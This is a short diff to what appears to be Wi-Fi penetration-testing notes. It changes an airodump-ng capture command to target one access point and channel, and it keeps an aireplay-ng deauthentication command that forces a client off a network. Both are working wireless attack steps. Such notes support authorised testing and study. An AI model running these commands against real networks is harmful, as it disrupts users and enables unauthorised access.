@@ -19,7 +19,7 @@ filter on bssid
 ## Recon specific (monitor channel 3)
 ```
 sudo airmon-ng start wlan0 3
-sudo airodump-ng -b <bssid> -e <essid> wlan0mon -w <fileprefix>
+sudo airodump-ng --bssid <bssid> --essid <essid> wlan0mon -w <fileprefix> --channel <channel>
 ```
 Then deauth from another shell or wifi card:
 ```sudo aireplay-ng -0 5 -a <BSSID> -c <client MAC> wlan0mon```
